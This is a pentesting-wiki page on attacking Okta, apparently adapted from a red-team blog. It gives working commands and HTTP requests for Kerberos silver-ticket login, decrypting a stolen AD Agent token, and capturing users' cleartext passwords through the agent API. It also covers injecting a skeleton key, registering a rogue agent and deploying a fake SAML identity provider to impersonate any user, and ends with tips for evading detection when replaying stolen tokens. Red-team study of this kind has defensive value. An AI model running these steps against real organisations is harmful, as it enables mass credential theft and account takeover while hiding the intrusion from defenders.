# Okta Security

<details>

<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Other ways to support HackTricks:

* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## Basic Information

Okta, Inc. is an **identity and access management company** that provides cloud software to help companies **manage and secure user authentication into modern applications**, and for developers to build identity controls into applications, website web services and devices.

Their core service, called the Okta Identity Cloud, offers products that include single sign-on (SSO), multi-factor authentication (MFA), lifecycle management, universal directory, API access management, and more. This helps companies to both protect their sensitive data and also streamline user access, making applications and services more accessible and easy to use for employees or customers.

Okta's services are widely used in enterprise contexts, as well as by smaller companies and developers. It plays a crucial role in enabling businesses to securely adopt and manage cloud technologies. As of my knowledge cutoff in September 2021, Okta remains a significant player in the Identity and Access Management (IAM) industry.

{% hint style="danger" %}
The main gola of Okta is to configure access to different users and groups to external applications. If you manage to **compromise administrator privileges in an Oktas** environment, you will highly probably able to **compromise all the other platforms the company is using**.
{% endhint %}

{% hint style="success" %}
To perform a security review of an Okta environment you should ask for **administrator read-only access**.
{% endhint %}

### Summary

There are **users** (which can be **stored in Okta,** logged from configured **Identity Providers** or authenticated via **Active Directory** or LDAP).\
These users can be inside **groups**.\
There are also **authenticators**: different options to authenticate like password, and several 2FA like WebAuthn, email, phone, okta verify (they could be enabled or disabled)...

Then, there are **applications** syncronized with Okta. Each applications will have some **mapping with Okta** to share information (such as email addresses, first names...). Moreover, each application must be inside an **Authentication Policy**, which indicates the **needed authenticators** for a user to **access** the application.

{% hint style="danger" %}
The most powerful role is **Super Administrator**.

If an attacker compromise Okta with Administrator access, all the **apps trusting Okta** will be highly probably **compromised**.
{% endhint %}

## Attacks

### Locating Okta Portal

Usually the portal of a company will be located in **companyname.okta.com**. If not, try simple **variations** of **companyname.** If you cannot find it, it's also possible that the organization has a **CNAME** record like **`okta.companyname.com`** pointing to the **Okta portal**.

### Login in Okta via Kerberos

(Attack copied [**from here**](https://trustedsec.com/blog/okta-for-red-teamers)).

If a domain like **`companyname.kerberos.okta.com`** exists, then kerneros is configured within the company to access Okta. This is very interesting as usually Windows users won't need MFA to access Okta.

It's also possible to find Kerberos users configured with Okta access within the AD env running:

```bash
getST.py -spn HTTP/clientname.kerberos.okta.com -dc-ip 1.2.3.4 LAB/comprommiseduser
```

With a ticket retrieved for the AD user, we need to inject this on a host we control using Rubeus or Mimikatz:

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

You‚Äôll need to make sure that `clientname.kerberos.okta.com` is added to the ‚ÄúIntranet‚Äù security zone in Internet Options. And then, in our browser, if we hit the below URL, we should find that we receive a JSON response providing an `OK` result when the Kerberos ticket is accepted:

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Heading over to the Okta dashboard, if everything is OK, you‚Äôll be signed in.

Moreover, if we are able to compromise the actual Okta service account exposing the delegation SPN, we can perform a Silver Ticket attack.

It should be noted that as Okta only support AES for ticket encryption, we‚Äôll need to ensure we have the AES key or plaintext password to authenticate:

<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

To craft our ticket for the victim user of `testuser`, we use:

{% code overflow="wrap" %}
```bash
ticketer.py -domain-sid S-1-5-21-4170871944-1575468979-147100471 -domain lab.local -dc-ip DC01 -aesKey db22ab9c89f2f0d545024f9dfabbed44173397065d8f5b7e172200ca38ed4393 -user-id 1118 -spn HTTP/example.kerberos.okta.com testuser
```
{% endcode %}

And again, deliver this to Okta via our browser session:

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Hijacking Okta AD Agent

(Attack copied [**from here**](https://trustedsec.com/blog/okta-for-red-teamers)).

If you access a server running the Okta AD Agent. This agent is responsible for syncing domain users and groups over to Okta for provisioning, and also answering authentication requests from Okta as users log into the portal.

By default, the agent is installed to:

```bash
C:\Program Files (x86)\Okta\Okta AD Agent
```

We‚Äôre going to take a look at the `OktaAgentService.exe.config`, which contains a few interesting bits of XML:

<figure><img src="../../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

The Base64 encoded `AgentToken` is where we set our sights. If we open up `OktaAgentService.exe` in dnSpy, we can see how these values are decrypted:

<figure><img src="../../.gitbook/assets/image (5) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

That‚Äôs right.. good ol‚Äô DPAPI! The `RandomEntropy` value is set to a value of:

<figure><img src="../../.gitbook/assets/image (6) (1) (1).png" alt=""><figcaption></figcaption></figure>

This means that we can decrypt this Base64 encoded XML value using:

```powershell
Add-Type -AssemblyName 'System.Security'
$rand = [byte]174,53,167,191,10,250,125,232,223,147,248,86,65

$k = [System.Security.Cryptography.ProtectedData]::Unprotect([System.Convert]::FromBase64String("AQAAANCMnd8BFdERjH..."), $rand, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
[System.Text.Encoding]::Unicode.GetString($k)
```

The DPAPI master key used belongs to the user account running the ‚ÄúOkta AD Agent‚Äù service, so you will need to run the above in the context of the service account, or grab the master key for the account and decrypt:

<figure><img src="../../.gitbook/assets/image (7) (1) (1).png" alt=""><figcaption></figcaption></figure>

For example, within `OktaAgentService.exe.config` we have two further XML fields, `APPID` and `AGENTID`. Combined with the `AgentToken`, we can make a `GET` request as follows:

```xml
GET /api/1/internal/app/activedirectory/[APPID]/agent/[AGENTID]/nextAction?agentVersion=1&pollid=anything HTTP/1.1
Host: client.okta.com
Authorization: SSWS 00OfIl_Gi1rZu1NETmHo6auU6YZEOEn8ZlDhyqstiZ
```

This call will block until a user authenticates to Okta (or the request times out), in which case it will return the next provided username and password in cleartext:

```xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<action>
    <UserAuth actionId="rpc::app.active_directory.agent.reply.ok14-majorecs02a.auw2-ok14.internal//1670637714886//Y5PojoeQQ3KDgHHzA11P9wAAC8g:e9088489-99ff-435a-943b-b7dccc457cb5:">
        <type>USER_AUTH</type>
        <password>abc123</password>
        <useLdapGroupPasswordPolicy>false</useLdapGroupPasswordPolicy>
        <userName>domuser@lab.local</userName>
    </UserAuth>
</action>
```

While this allows capturing credentials, we also have the opportunity to reply to this authentication attempt if we want to do something like provide a skeleton key. We do this by issuing the following HTTP request:

```xml
POST /api/1/internal/app/activedirectory/0oa7c027u2tcjxoki697/agent/a537ca54okqfsuu0s697/actionResult?responseid=12345 HTTP/1.1
Host: client.okta.com
Authorization: SSWS 00JFtjd...WgkeI1Eg5Y
Content-Type: application/xml; charset=utf-8
Content-Length: 1362

<agentActionResult xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" actionId="rpc::app.active_directory.agent.reply.ok14-majorecs04a.auw2-ok14.internal//1694301421033//ZPz86MzEBzhpMhSFWzyK5wAAA_Q:440a7d52-704b-4c1b-ac79-afdc241e3080:">
  <type>USER_AUTH</type>
  <status>SUCCESS</status>
  <message></message>
  <errorCode></errorCode>
  <timestamps>
    <actionRecieivedFromOkta>1694358076</actionRecieivedFromOkta>
    <actionSentToLdapServer>1694358076</actionSentToLdapServer>
    <responseReceivedFromLdapServer>1694358076</responseReceivedFromLdapServer>
    <responseSentToOkta>1694358076</responseSentToOkta>
    <actionReceivedFromOktaMilliseconds>20230910150116.726Z</actionReceivedFromOktaMilliseconds>
    <actionSentToLdapServerMilliseconds>20230910150116.741Z</actionSentToLdapServerMilliseconds>
    <responseReceivedFromLdapServerMilliseconds>20230910150116.741Z</responseReceivedFromLdapServerMilliseconds>
    <responseSentToOktaMilliseconds>20230910150116.741Z</responseSentToOktaMilliseconds>
  </timestamps>
  <additionalInfo>{{"ExecutionTime":"12","AgentUpTime":"0 day(s) 22:41:49","DC":"DC01.lab.local","DomainControllerFunctionality":"WIN2016","DomainFunctionality":"WIN2016","ForestFunctionality":"WIN2016","LdapResponseTime":"0"}}</additionalInfo>
</agentActionResult>
```

The result of issuing this request is allowing authentication for any user via Okta.

### Hijacking AD As an Admin

(Attack copied [**from here**](https://trustedsec.com/blog/okta-for-red-teamers)).

We know that we can hijack an Okta AD Agent using a stolen Agent Token, but what about if we have compromised a privileged Okta account and want to do this without an existing agent token? Let‚Äôs look at how to do this.

First, we need to create an Okta AD Agent API token. To kick off the authentication flow, we need an OAuth Code. To get this we start by heading to:

{% code overflow="wrap" %}
```
https://example.okta.com/oauth2/authorize?redirect_uri=%2Foauth-response&response_type=code&client_id=cappT0Hfy97F1BoO1UTR&prompt=select_account
```
{% endcode %}

This will give you a permission prompt for you to accept:

<figure><img src="../../.gitbook/assets/image (8) (1) (1).png" alt=""><figcaption></figcaption></figure>

Accepting the presented prompt will give you a redirection to `/oauth-response` along with a `code` parameter:

<figure><img src="../../.gitbook/assets/image (9) (1) (1).png" alt=""><figcaption></figcaption></figure>

We need to take this `code` parameter and request a API token using the POST request:

```
POST /oauth2/token HTTP/1.1
User-Agent: Okta AD Agent/3.16.0 (Microsoft Windows NT 6.2.9200.0; .NET CLR 4.0.30319.42000; 64-bit OS; 64-bit Process; sslpinning=disabled)
Content-Type: application/x-www-form-urlencoded
Host: example.okta.com
Content-Length: 65
Expect: 100-continue
Accept-Encoding: gzip, deflate
Connection: Keep-Alive

grant_type=api_token&code=7vzn01sl&client_id=cappT0Hfy97F1BoO1UTR
```

The response returns to us our API token:

```
{"api_token":"00456b2Lllk2KqjLBvaxANWEgTd7bqjsxjo8aZj0wd"}
```

Using this token, we need to associate it with an active AD domain. We do this using the API call:

```
POST /api/1/internal/app/activedirectory/ HTTP/1.1
User-Agent: Okta AD Agent/3.16.0 (Microsoft Windows NT 6.2.9200.0; .NET CLR 4.0.30319.42000; 64-bit OS; 64-bit Process; sslpinning=disabled)
Host: example.okta.com
Accept: application/xml; charset=UTF-8
Content-Type: application/xml; charset=UTF-8
Content-Length: 86
Authorization: SSWS 00456b2Lllk2KqjLBvaxANWEgTd7bqjsxjo8aZj0wd

<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<domain name="lab.local" />
```

This will give us back the following XML response, where we need to retain the `id` attribute value for later

```xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<activeDirectory id="0oa4jsza16ar1UdaW696">
<name>lab.local</name>
<newInstance>false</newInstance>
</activeDirectory>
```

Next, we make a HTTP API call to name our connector:

```
POST /api/1/internal/app/activedirectory/0oa4jsza16ar1UdaW196/agent?name=DC02 HTTP/1.1
Host: example.okta.com
Content-Type: text/xml
Content-Length: 0
Authorization: SSWS 00456b2Lllk2KqjLBvaxANWEgTd7bqjsxjo8aZj0wd
```

This will return an XML response where again we need to retain the `id` attribute:

{% code overflow="wrap" %}
```
<?xml version="1.0" encoding="UTF-8" standalone="yes"?><agent id="a532camqiqXMhlOf5697"><name>DC02</name></agent>
```
{% endcode %}

Finally, we initialize the connection to allow receiving data:

```xml
POST /api/1/internal/app/activedirectory/0oa4jsza16ar1UdaW196/agent/a532camqiqXMhlOf5697/actionResult?agentVersion=3.13.0.0 HTTP/1.1
Host: example.okta.com
Content-Type: text/xml
Content-Length: 825
Authorization: SSWS 00456b2Lllk2KqjLBvaxANWEgTd7bqjsxjo8aZj0wd

<agentActionResult xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
  <type>INIT</type>
  <status>SUCCESS</status>
  <timestamps>
    <actionRecieivedFromOkta />
    <actionSentToLdapServer />
    <responseReceivedFromLdapServer />
    <responseSentToOkta>1694304008</responseSentToOkta>
    <actionReceivedFromOktaMilliseconds>00010101000000.000Z</actionReceivedFromOktaMilliseconds>
    <actionSentToLdapServerMilliseconds>00010101000000.000Z</actionSentToLdapServerMilliseconds>
    <responseReceivedFromLdapServerMilliseconds>00010101000000.000Z</responseReceivedFromLdapServerMilliseconds>
    <responseSentToOktaMilliseconds>20230910000008.174Z</responseSentToOktaMilliseconds>
  </timestamps>
  <additionalInfo>{}</additionalInfo>
</agentActionResult>
```

With this done, our fake AD agent is now ready, and will process authentication attempts as shown previously.

Now obviously we don‚Äôt want to be doing all this using Burp, so a tool has been created to support a few use-cases. This is available from [here](https://github.com/xpn/OktaPostExToolkit).

The first mode we can run this tool in is `token` mode, which takes a compromised Agent Token value and will connect to the Okta API, dumping any credentials it receives:

{% code overflow="wrap" %}
```bash
python ./main.py --tenant-domain example.okta.com --skeleton-key WibbleWobble99 token --api-token 00456b2Lllk2KqjLBvaxANWEgTd7bqjsxjo8aZj0wd --app-id 0oa7c027u2TcJxoki697 --agent-id a537cnm9ldwPILkqP697
```
{% endcode %}

Video examples:

* [https://www.youtube.com/watch?v=ZYRcfj6jtaA](https://www.youtube.com/watch?v=ZYRcfj6jtaA)
* [https://youtu.be/Sob2u6xEjTE](https://youtu.be/Sob2u6xEjTE)

The tool also allows registering a new AD connector if we have administrative credentials available for an Okta user that‚Äôs using:

{% code overflow="wrap" %}
```bash
python ./main.py --tenant-domain example.okta.com --skeleton-key WibbleWobble99 oauth --machine-name DC01 --windows-domain lab.local --code OAUTH_CODE_HERE
```
{% endcode %}

### Okta Fake SAML Provider

(Attack copied [**from here**](https://trustedsec.com/blog/okta-for-red-teamers)).

Another technique which has been very useful during assessments is the deployment of a fake SAML provider.

Recently Okta actually provided [a security update](https://sec.okta.com/articles/2023/08/cross-tenant-impersonation-prevention-and-detection) on in-the-wild attacks using this technique, so it‚Äôs certainly useful to know about this when simulating activity on an environment, especially for clients who would like to test their detections of this particular attack.

If we hold access to an elevated Okta account, we can deploy an external Identity Provider as part of Okta‚Äôs functionality. This allows external providers like Entra ID to complete the authentication before redirecting the user to Okta to select integrated apps.

But what happens if we control the IDP? Well, it stands to reason that in this case, we can approve any authentication request we want.

To test this, we need a custom Identity Provider to deploy. A very janky SAML IDP which supports our nefarious activities can be found [here](https://github.com/xpn/OktaPostExToolkit). The core idea behind this tool is to allow us to issue signed SAML authentication responses which correspond to any user that we like.

This server will listen for incoming HTTP requests on `/saml`, so we first need to deploy an IDP to Okta.

First, we select the SAML 2.0 IDP:

<figure><img src="../../.gitbook/assets/image (10) (1) (1).png" alt=""><figcaption></figcaption></figure>

When configuring the IDP, we need to pay attention to a few settings. The first is the `Name`, which is the friendly name to be shown to any other administrators of Okta.

Next is the issuer URL, which should be set to the value of an identifier in URI format. This again can be anything, but we‚Äôll use `https://www.example.com/`.

<figure><img src="../../.gitbook/assets/image (11) (1).png" alt=""><figcaption></figcaption></figure>

We also need to set the `IdP Single Sign-On URL` field to the location where our SAML server is running. Now, the cool thing is that this DOES NOT need to be a URL which points to our server. I feel like it‚Äôs worth pointing this out because we can get quite creative in the URL that we input here and make the Blue Team‚Äôs job a bit harder. For example, we can set this field to something like `https://idp.google.com/saml` if we want to, and the only thing we need to be able to do is to catch the inbound SAML request. Here‚Äôs the cool thing: the SAML request is forwarded client-side. By that, I mean that Okta will generate the SAML `AuthRequest` and have our browser redirect to `https://idp.google.com/` along with the SAML request. This of course, means that we can just modify the local hosts file to point `idp.google.com` to `127.0.0.1`:

```bash
echo '127.0.0.1 idp.google.com' | sudo tee -a /etc/hosts
```

We also need a signing certificate that we control. This can be self-signed, and generated using OpenSSL with:

{% code overflow="wrap" %}
```bash
openssl req -x509 -newkey rsa:2048 -sha256 -days 365 -nodes -keyout example.com.key -out example.com.crt
```
{% endcode %}

Again, you can get creative with this, as there are no specific requirements around the authenticity of this certificate.

Once the key is generated, we just upload the certificate to Okta and create our IDP.

<figure><img src="../../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>

Finally, we need to make sure that `Match Against` is set to `Okta Username or Email` and `Account Link Policy` is set to `Automatic` to allow us to authenticate to existing Okta accounts:

<figure><img src="../../.gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>

With everything saved, we need to download the Metadata:

<figure><img src="../../.gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>

Then to initiate the authentication request and issue the `AuthRequest`, we navigate to the URL shown in `Assertion Consumer Service URL`:

<figure><img src="../../.gitbook/assets/image (15).png" alt=""><figcaption></figcaption></figure>

Navigating to this URL results in a redirect to our internal SAML server:

<figure><img src="../../.gitbook/assets/image (16).png" alt=""><figcaption></figcaption></figure>

If we provide an email address, we find that we can authenticate as any Okta user without needing to know their credentials.

Let‚Äôs see this in action in [https://youtu.be/uw1hlKNDG2c](https://youtu.be/uw1hlKNDG2c)

### Phishing Okta Portal with Evilgnix

In [**this blog post**](https://medium.com/nickvangilder/okta-for-red-teamers-perimeter-edition-c60cb8d53f23) is explained how to prepare a phishing campaign against an Okta portal.

### Colleague Impersonation Attack

The **attributes that each user can have and modify** (like email or first name) can be configured in Okta. If an **application** is **trusting** as ID an **attribute** that the user can **modify**, he will be able to **impersonate other users in that platform**.

Therefore, if the app is trusting the field **`userName`**, you probably won't be able to change it (because you usually cannot change that field), but if it's trusting for example **`primaryEmail`** you might be able to **change it to a colleagues email address** and impersonate it (you will need to have access to the email and accept the change).

Note that this impersoantion depends on how each application was condigured. Only the ones trusting the field you modified and accepting updates will be compromised.\
Therefore, the app should have this field enabled if it exists:

<figure><img src="../../.gitbook/assets/image (89).png" alt=""><figcaption></figcaption></figure>

I have also seen other apps that were vulnerable but didn't have that field in the Okta settings (at the end different apps are configured differently).

The best way to find out if you could impersonate anyone on each app would be to try it!

## Evading behavioural detection policies <a href="#9fde" id="9fde"></a>

Unless it‚Äôs been disclosed in advance, you probably won‚Äôt know if behavioral detection policies have been implemented until you encounter them. One **potential way to bypass Okta‚Äôs behavioral** detection policies is to simply **avoid the main Okta dashboard** altogether and target Okta applications directly (this would be the applications in the above screenshot that are obscured by red boxes). If you are in possession of an Okta access token, instead of replaying the token at the main Okta login page of your target company, you would replay the token at the application-specific Okta URL.

Another recommendations are:

* Be careful replaying captured access tokens from popular anonymizer proxies and VPN services.
* When replaying an access token, use the same user-agent string used by the client.
* Be careful replaying captured access tokens from separate users from the same IP address.
* Be careful replaying captured access tokens against the Okta dashboard.
* If you know the companies IP addresses that victims will be using, consider blocking all other traffic other than that IP or IP range.

## Okta Hardening

Okta has a lot of possible configurations, in this page you will find how to review them so they are as secure as possible:

{% content-ref url="okta-hardening.md" %}
[okta-hardening.md](okta-hardening.md)
{% endcontent-ref %}

## References

* [https://trustedsec.com/blog/okta-for-red-teamers](https://trustedsec.com/blog/okta-for-red-teamers)
* [https://medium.com/nickvangilder/okta-for-red-teamers-perimeter-edition-c60cb8d53f23](https://medium.com/nickvangilder/okta-for-red-teamers-perimeter-edition-c60cb8d53f23)

<details>

<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Other ways to support HackTricks:

* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
